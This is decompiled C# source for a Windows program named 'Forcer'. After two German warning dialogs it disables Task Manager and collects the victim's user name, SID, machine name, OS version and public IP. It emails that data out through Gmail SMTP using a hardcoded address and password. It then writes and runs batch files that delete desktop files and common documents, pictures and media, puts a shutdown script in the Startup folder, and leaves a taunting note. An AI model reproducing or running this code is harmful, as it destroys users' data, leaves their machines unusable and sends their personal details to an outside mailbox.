using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Forcer;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Invalid comparison between Unknown and I4
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Invalid comparison between Unknown and I4
		DialogResult val = MessageBox.Show("Diese Datei kann persönliche Daten abrufen und senden,\ndarunter: [IP, Username, HWID, PC Name, Uhrzeit, Datum, Speicherort und OS Version]\nDieses Programm schädigt sehr Ihren PC,\ndarunter: [Löscht Dateien aus verschiedenen Verzeichnissen, PC fährt bei jedem Hochfahren wieder runter,...]\nSind Sie dennoch einverstanden, das Programm auszuführen?", "WARNUNG | Forcer.exe", (MessageBoxButtons)4, (MessageBoxIcon)48);
		if ((int)val != 6)
		{
			return;
		}
		DialogResult val2 = MessageBox.Show("SIND SIE SICH DA GANZ SICHER?", "LETZTE WARNUNG | Forcer.exe", (MessageBoxButtons)4, (MessageBoxIcon)16);
		if ((int)val2 != 6)
		{
			return;
		}
		char c = '"';
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		registryKey.Close();
		string userName = Environment.UserName;
		string currentDirectory = Environment.CurrentDirectory;
		string machineName = Environment.MachineName;
		string text = Environment.OSVersion.ToString();
		string text2 = WindowsIdentity.GetCurrent().User!.Value.ToString();
		WebClient webClient = new WebClient();
		string text3 = webClient.DownloadString("http://ipinfo.io/json");
		MailAddress mailAddress = new MailAddress("keinplan451@gmail.com", "From Name");
		MailAddress to = new MailAddress("keinplan451@gmail.com", "To Name");
		string subject = Environment.UserName + " => Spyed + Destroyed";
		string body = "Zeit: " + DateTime.Now.Hour + ":" + DateTime.Now.Minute + "\n\nDatum: " + DateTime.Now.Day + "." + DateTime.Now.Month + "." + DateTime.Now.Year + "\n\nUser Name: " + userName + "\n\nIP: " + text3 + "\n\nDirectory: " + currentDirectory + "\n\nPC Name: " + machineName + "\n\nOS Version: " + text + "\n\nHardwareID: " + text2 + "\n\n";
		string path = "C:\\ProgramData\\delDesktop.bat";
		if (!File.Exists(path))
		{
			using StreamWriter streamWriter = File.CreateText(path);
			streamWriter.WriteLine("cd %userprofile%\\desktop");
			streamWriter.WriteLine("FOR %%A IN (*.*) DO DEL %%A");
			streamWriter.Close();
			Process.Start("C:\\ProgramData\\delDesktop.bat");
		}
		string path2 = "C:\\Users\\" + Environment.UserName + "\\Desktop\\LESE MICH LOL.txt";
		if (!File.Exists(path2))
		{
			using StreamWriter streamWriter2 = File.CreateText(path2);
			streamWriter2.WriteLine("Es ist Zeit sich zu verabschieden!");
			streamWriter2.WriteLine("Du bist so gefickt HAHAHAHHAHAH");
			streamWriter2.Close();
		}
		string path3 = "C:\\ProgramData\\shutdown.bat";
		if (!File.Exists(path3))
		{
			using StreamWriter streamWriter3 = File.CreateText(path3);
			streamWriter3.WriteLine("shutdown /s /t 0");
			streamWriter3.Close();
		}
		string path4 = "C:\\ProgramData\\copy.bat";
		if (!File.Exists(path4))
		{
			using StreamWriter streamWriter4 = File.CreateText(path4);
			string text4 = "C:\\ProgramData\\shutdown.bat";
			string text5 = "%userprofile%\\STARTM~1\\Programs\\Startup";
			streamWriter4.WriteLine("copy " + c + text4 + c + " " + c + text5 + c);
			streamWriter4.Close();
		}
		string path5 = "C:\\ProgramData\\delData.bat";
		if (!File.Exists(path5))
		{
			using StreamWriter streamWriter5 = File.CreateText(path5);
			string text6 = "E:\\Dokumente\\*.exe";
			string text7 = "C:\\Dokumente\\*.exe";
			string text8 = "D:\\Dokumente\\*.exe";
			string text9 = "E:\\Downloads\\*.exe";
			string text10 = "C:\\Downloads\\*.exe";
			string text11 = "E:\\Dokumente\\*.png";
			string text12 = "C:\\Dokumente\\*.pdf";
			string text13 = "D:\\Dokumente\\*.jpg";
			string text14 = "E:\\Downloads\\*.mp4";
			string text15 = "C:\\Downloads\\*.png";
			string text16 = "E:\\Downloads\\*.mp3";
			string text17 = "C:\\Musik\\*.mp3";
			string text18 = "E:\\Bilder\\*.png";
			string text19 = "D:\\Bilder\\*.png";
			string text20 = "C:\\Bilder\\*.png";
			string text21 = "E:\\Dokumente\\*.pdf";
			string text22 = "C:\\Dokumente\\*.pdf";
			string text23 = "D:\\Dokumente\\*.pdf";
			streamWriter5.WriteLine("del " + c + text6 + c);
			streamWriter5.WriteLine("del " + c + text7 + c);
			streamWriter5.WriteLine("del " + c + text8 + c);
			streamWriter5.WriteLine("del " + c + text9 + c);
			streamWriter5.WriteLine("del " + c + text10 + c);
			streamWriter5.WriteLine("del " + c + text11 + c);
			streamWriter5.WriteLine("del " + c + text12 + c);
			streamWriter5.WriteLine("del " + c + text13 + c);
			streamWriter5.WriteLine("del " + c + text14 + c);
			streamWriter5.WriteLine("del " + c + text15 + c);
			streamWriter5.WriteLine("del " + c + text16 + c);
			streamWriter5.WriteLine("del " + c + text17 + c);
			streamWriter5.WriteLine("del /S" + c + text18 + c);
			streamWriter5.WriteLine("del /S" + c + text19 + c);
			streamWriter5.WriteLine("del /S" + c + text20 + c);
			streamWriter5.WriteLine("del " + c + text21 + c);
			streamWriter5.WriteLine("del " + c + text22 + c);
			streamWriter5.WriteLine("del " + c + text23 + c);
			streamWriter5.Close();
		}
		Process.Start("C:\\ProgramData\\delData.bat");
		Process.Start("C:\\ProgramData\\copy.bat");
		SmtpClient smtpClient = new SmtpClient
		{
			Host = "smtp.gmail.com",
			Port = 587,
			EnableSsl = true,
			DeliveryMethod = SmtpDeliveryMethod.Network,
			UseDefaultCredentials = false,
			Credentials = new NetworkCredential(mailAddress.Address, "keinplan451keinplan451")
		};
		using (MailMessage message = new MailMessage(mailAddress, to)
		{
			Subject = subject,
			Body = body
		})
		{
			smtpClient.Send(message);
		}
		Process.Start("C:\\Users\\" + Environment.UserName + "\\Desktop\\LESE MICH LOL.txt");
		Thread.Sleep(TimeSpan.FromSeconds(10.0));
		Process.Start("C:\\ProgramData\\shutdown.bat");
	}
}
